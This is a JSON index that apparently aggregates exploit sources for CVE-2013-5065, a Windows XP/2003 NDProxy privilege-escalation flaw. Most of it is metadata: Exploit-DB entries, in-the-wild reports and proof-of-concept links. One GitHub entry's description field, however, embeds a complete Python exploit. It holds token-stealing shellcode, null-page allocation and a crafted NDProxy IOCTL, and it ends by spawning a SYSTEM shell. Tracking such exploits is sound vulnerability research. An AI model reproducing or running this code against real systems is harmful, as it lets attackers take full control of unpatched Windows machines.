{
  "exploitdb": [
    {
      "cve": "CVE-2013-5065",
      "id": "30014",
      "file": "exploits/windows/local/30014.py",
      "description": "Microsoft Windows - 'NDPROXY' SYSTEM Privilege Escalation (MS14-002)",
      "author": "ryujin",
      "application_url": "",
      "source_url": "",
      "screenshot": "http://www.exploit-db.com/screenshots/idlt30500/ndproxy.png",
      "verified": true,
      "codes": "CVE-2013-5065;MS14-002",
      "tags": "",
      "type": "local",
      "platform": "windows",
      "port": "",
      "aliases": "",
      "date_added": "2013-12-03T00:00:00Z",
      "date_updated": "2017-04-15T00:00:00Z",
      "date_published": "2013-12-03T00:00:00Z"
    },
    {
      "cve": "CVE-2013-5065",
      "id": "30392",
      "file": "exploits/windows/local/30392.rb",
      "description": "Microsoft Windows - 'ndproxy.sys' Local Privilege Escalation (Metasploit)",
      "author": "Metasploit",
      "application_url": "",
      "source_url": "http://technet.microsoft.com/en-us/security/advisory/2914486",
      "screenshot": "",
      "verified": true,
      "codes": "CVE-2013-5065;OSVDB-100368",
      "tags": "Metasploit Framework (MSF)",
      "type": "local",
      "platform": "windows",
      "port": "",
      "aliases": "",
      "date_added": "2013-12-17T00:00:00Z",
      "date_updated": "2013-12-17T00:00:00Z",
      "date_published": "2013-12-17T00:00:00Z"
    },
    {
      "cve": "CVE-2013-5065",
      "id": "37732",
      "file": "exploits/windows_x86/local/37732.c",
      "description": "Microsoft Windows XP SP3 (x86) / 2003 SP2 (x86) - 'NDProxy' Local Privilege Escalation (MS14-002)",
      "author": "Tomislav Paskalev",
      "application_url": "",
      "source_url": "",
      "screenshot": "",
      "verified": false,
      "codes": "CVE-2013-5065;OSVDB-100368;MS14-002",
      "tags": "",
      "type": "local",
      "platform": "windows_x86",
      "port": "",
      "aliases": "",
      "date_added": "2015-08-07T00:00:00Z",
      "date_updated": "2017-05-19T00:00:00Z",
      "date_published": "2015-08-07T00:00:00Z"
    }
  ],
  "itw": [
    {
      "id": "CVE-2013-5065",
      "description": "NDProxy.sys in the kernel in Microsoft Windows XP SP2 and SP3 and Server 2003 SP2 allows local users to gain privileges via a crafted application, as exploited in the wild in November 2013.",
      "referenceURL": "https://nvd.nist.gov/vuln/detail/CVE-2013-5065",
      "reportURL": "https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms_ndproxy.rb",
      "timeStamp": "2021-08-27T17:15:33Z"
    },
    {
      "id": "CVE-2013-5065",
      "description": "NDProxy.sys in the kernel in Microsoft Windows XP SP2 and SP3 and Server 2003 SP2 allows local users to gain privileges via a crafted application, as exploited in the wild in November 2013.",
      "referenceURL": "https://nvd.nist.gov/vuln/detail/CVE-2013-5065",
      "reportURL": "https://www.exploit-db.com/exploits/37732",
      "timeStamp": "2024-07-24T14:29:00Z"
    }
  ],
  "trickest": [
    {
      "id": "CVE-2013-5065",
      "url": "https://github.com/ycdxsb/WindowsPrivilegeEscalation",
      "added_at": "2022-02-10T19:32:13Z"
    },
    {
      "id": "CVE-2013-5065",
      "url": "https://www.exploit-db.com/exploits/37732",
      "added_at": "2022-02-10T19:32:13Z"
    }
  ],
  "nomisec": [
    {
      "cveId": "CVE-2013-5065",
      "id": 15000564,
      "name": "RobbinHood",
      "full_name": "Friarfukd/RobbinHood",
      "owner": {
        "login": "Friarfukd",
        "id": 6127925,
        "avatar_url": "https://avatars.githubusercontent.com/u/6127925?v=4",
        "html_url": "https://github.com/Friarfukd",
        "user_view_type": "public"
      },
      "html_url": "https://github.com/Friarfukd/RobbinHood",
      "description": "# NDPROXY Local SYSTEM privilege escalation # http://www.offensive-security.com # Tested on Windows XP SP3 # http://www.offensive-security.com/vulndev/ndproxy-local-system-exploit-cve-2013-5065/     # Original crash ... null pointer dereference # Access violation - code c0000005 (!!! second chance !!!) # 00000038 ??              ???   from ctypes import * from ctypes.wintypes import * import os, sys   kernel32 = windll.kernel32 ntdll = windll.ntdll   GENERIC_READ     = 0x80000000 GENERIC_WRITE    = 0x40000000 FILE_SHARE_READ  = 0x00000001 FILE_SHARE_WRITE = 0x00000002 NULL = 0x0 OPEN_EXISTING = 0x3 PROCESS_VM_WRITE            = 0x0020 PROCESS_VM_READ             = 0x0010 MEM_COMMIT                  = 0x00001000 MEM_RESERVE                 = 0x00002000 MEM_FREE                    = 0x00010000 PAGE_EXECUTE_READWRITE      = 0x00000040 PROCESS_ALL_ACCESS          = 2097151 FORMAT_MESSAGE_FROM_SYSTEM  = 0x00001000 baseadd = c_int(0x00000001) MEMRES = (0x1000 | 0x2000) MEM_DECOMMIT = 0x4000 PAGEEXE = 0x00000040 null_size = c_int(0x1000) STATUS_SUCCESS = 0   def log(msg):     print msg   def getLastError():     \"\"\"[-] Format GetLastError\"\"\"     buf = create_string_buffer(2048)     if kernel32.FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL,             kernel32.GetLastError(), 0,             buf, sizeof(buf), NULL):         log(buf.value)     else:         log(\"[-] Unknown Error\")   print \"[*] Microsoft Windows NDProxy CVE-2013-5065 0day\" print \"[*] Vulnerability found in the wild\" print \"[*] Coded by Offensive Security\"                 tmp = (\"\\x00\"*4)*5 + \"\\x25\\x01\\x03\\x07\" + \"\\x00\"*4 + \"\\x34\\x00\\x00\\x00\" + \"\\x00\"*(84-24) InBuf = c_char_p(tmp)   dwStatus = ntdll.NtAllocateVirtualMemory(0xFFFFFFFF, byref(baseadd), 0x0, byref(null_size), MEMRES, PAGEEXE) if dwStatus != STATUS_SUCCESS:     print \"[+] Something went wrong while allocating the null paged memory: %s\" % dwStatus     getLastError() written = c_ulong() sh = \"\\x90\\x33\\xC0\\x64\\x8B\\x80\\x24\\x01\\x00\\x00\\x8B\\x40\\x44\\x8B\\xC8\\x8B\\x80\\x88\\x00\\x00\\x00\\x2D\\x88\\x00\\x00\\x00\\x83\\xB8\\x84\\x00\\x00\\x00\\x04\\x75\\xEC\\x8B\\x90\\xC8\\x00\\x00\\x00\\x89\\x91\\xC8\\x00\\x00\\x00\\xC3\" sc = \"\\x90\"*0x38 + \"\\x3c\\x00\\x00\\x00\" + \"\\x90\"*4 + sh + \"\\xcc\"*(0x400-0x3c-4-len(sh)) alloc = kernel32.WriteProcessMemory(0xFFFFFFFF, 0x00000001, sc, 0x400, byref(written)) if alloc == 0:     print \"[+] Something went wrong while writing our junk to the null paged memory: %s\" % alloc     getLastError()   dwRetBytes = DWORD(0) DEVICE_NAME   = \"\\\\\\\\.\\\\NDProxy\" hdev = kernel32.CreateFileA(DEVICE_NAME, 0, 0, None, OPEN_EXISTING , 0, None) if hdev == -1:     print \"[-] Couldn't open the device... :(\"     sys.exit() kernel32.DeviceIoControl(hdev, 0x8fff23cc, InBuf, 0x54, InBuf, 0x24, byref(dwRetBytes), 0) kernel32.CloseHandle(hdev) print \"[+] Spawning SYSTEM Shell...\" os.system(\"start /d \\\"C:\\\\windows\\\\system32\\\" cmd.exe\")",
      "fork": false,
      "created_at": "2013-12-07T05:37:28Z",
      "updated_at": "2016-09-04T16:47:18Z",
      "pushed_at": "2013-12-07T05:37:28Z",
      "stargazers_count": 0,
      "watchers_count": 0,
      "has_discussions": false,
      "forks_count": 1,
      "allow_forking": true,
      "is_template": false,
      "web_commit_signoff_required": false,
      "topics": [],
      "visibility": "public",
      "forks": 1,
      "watchers": 0,
      "score": 0,
      "subscribers_count": 1
    }
  ],
  "nuclei": [],
  "metasploit": [],
  "holloways": [
    {
      "cve": "CVE-2013-5065",
      "url": "https://cxsecurity.com/issue/WLB-2013120125",
      "added_at": "2013-12-17T00:00:00Z",
      "score": 0.7,
      "template_for": ""
    },
    {
      "cve": "CVE-2013-5065",
      "url": "https://cxsecurity.com/issue/WLB-2015080044",
      "added_at": "2015-08-09T00:00:00Z",
      "score": 0.7,
      "template_for": ""
    }
  ],
  "openpoc": [
    {
      "cve": "CVE-2013-5065",
      "url": "https://cxsecurity.com/issue/WLB-2013120125",
      "added_at": "2013-12-17T00:00:00Z",
      "score": 0.7,
      "template_for": ""
    },
    {
      "cve": "CVE-2013-5065",
      "url": "https://cxsecurity.com/issue/WLB-2015080044",
      "added_at": "2015-08-09T00:00:00Z",
      "score": 0.7,
      "template_for": ""
    },
    {
      "cve": "CVE-2013-5065",
      "url": "https://github.com/Friarfukd/RobbinHood",
      "added_at": "2013-12-07T05:37:28Z",
      "score": 0.4,
      "template_for": ""
    },
    {
      "cve": "CVE-2013-5065",
      "url": "https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms_ndproxy.rb",
      "added_at": "2021-08-27T17:15:33Z",
      "score": 0,
      "template_for": ""
    },
    {
      "cve": "CVE-2013-5065",
      "url": "https://github.com/ycdxsb/WindowsPrivilegeEscalation",
      "added_at": "2022-02-10T19:32:13Z",
      "score": 0.9,
      "template_for": ""
    },
    {
      "cve": "CVE-2013-5065",
      "url": "https://www.exploit-db.com/exploits/30014",
      "added_at": "2013-12-03T00:00:00Z",
      "score": 1,
      "template_for": ""
    },
    {
      "cve": "CVE-2013-5065",
      "url": "https://www.exploit-db.com/exploits/30392",
      "added_at": "2013-12-17T00:00:00Z",
      "score": 1,
      "template_for": ""
    },
    {
      "cve": "CVE-2013-5065",
      "url": "https://www.exploit-db.com/exploits/37732",
      "added_at": "2015-08-07T00:00:00Z",
      "score": 0.5,
      "template_for": ""
    }
  ]
}
